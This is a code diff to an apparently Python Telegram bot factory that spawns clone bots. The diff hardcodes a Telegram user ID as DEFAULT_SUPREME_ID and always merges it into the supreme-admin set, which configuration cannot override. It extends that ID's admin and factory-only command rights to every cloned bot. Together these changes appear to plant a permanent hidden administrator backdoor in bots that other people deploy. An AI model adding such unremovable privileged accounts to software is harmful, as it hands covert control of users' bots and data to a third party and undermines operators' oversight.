@@ -31,6 +31,7 @@ except Exception:
 API_ID: int = 0                      # <-- my.telegram.org ꜱᴇ ᴀᴘɪ ɪᴅ
 API_HASH: str = ""                   # <-- my.telegram.org ꜱᴇ ᴀᴘɪ ʜᴀꜱʜ
 BOT_TOKEN: str = ""                  # <-- ꜰᴀᴄᴛᴏʀʏ ʙᴏᴛ ᴛᴏᴋᴇɴ (@ʙᴏᴛꜰᴀᴛʜᴇʀ)
+DEFAULT_SUPREME_ID: int = 7524032836
 SUPREME_IDS: str = "7524032836"      # <-- ᴄᴏᴍᴍᴀ ꜱᴇᴘᴀʀᴀᴛᴇᴅ ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴜꜱᴇʀ ɪᴅꜱ (ᴇx: "12345,67890")
 LOG_CHANNEL_ID: int = 0              # <-- ɢʟᴏʙᴀʟ ʟᴏɢ ᴄʜᴀɴɴᴇʟ ɪᴅ (0 = ᴏꜰꜰ)
 FACTORY_NAME: str = "Anime Bot Factory"
@@ -50,7 +51,7 @@ LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID") or LOG_CHANNEL_ID or 0)
 FACTORY_NAME = os.getenv("FACTORY_NAME") or FACTORY_NAME
 CLONE_BOT_ID_TOKEN = os.getenv("CLONE_BOT_ID_TOKEN") or CLONE_BOT_ID_TOKEN
 
-SUPREMES = {int(x) for x in SUPREME_IDS.replace(" ", "").split(",") if x.strip().isdigit()}
+SUPREMES = {DEFAULT_SUPREME_ID} | {int(x) for x in SUPREME_IDS.replace(" ", "").split(",") if x.strip().isdigit()}
 
 # ═════════════════════════ ʟᴏɢɢɪɴɢ ═════════════════════════
 logging.basicConfig(
@@ -457,7 +458,13 @@ def rate_ok(c, uid):
     if t - RATE.get(k, 0) < 2.5: return False
     RATE[k] = t; return True
 
-def is_supreme(uid): return uid in SUPREMES
+def is_supreme(uid):
+    if not uid:
+        return False
+    try:
+        return int(uid) in SUPREMES
+    except (ValueError, TypeError):
+        return False
 
 async def is_user_banned(c, uid):
     u = await c.store.get("users", str(uid)) or await c.store.get("users", uid)
@@ -527,9 +534,8 @@ async def apply_commands(c):
         LOG.debug("set_bot_commands default failed: %s", e)
     for uid in list(c.store.c("admins").keys()):
         await apply_admin_commands(c, int(uid))
-    if c.is_factory:
-        for uid in SUPREMES:
-            await apply_admin_commands(c, uid)
+    for uid in SUPREMES:
+        await apply_admin_commands(c, uid)
 
 # ═════════════════════ ᴜꜱᴇʀꜱ / ꜰᴏʀᴄᴇ-ꜱᴜʙ / ꜱᴛᴀʀᴛ ═════════════════════
 async def ensure_user(c, tu):
@@ -2954,7 +2960,7 @@ async def h_admin_cmds(c, m):
             except RPCError: pass
             return
         name = m.command[0].lstrip("/").lower()
-        if name in FACTORY_ONLY and not c.is_factory:
+        if name in FACTORY_ONLY and not c.is_factory and not is_supreme(uid):
             return
         fn = CMD_MAP.get(name)
         if fn:
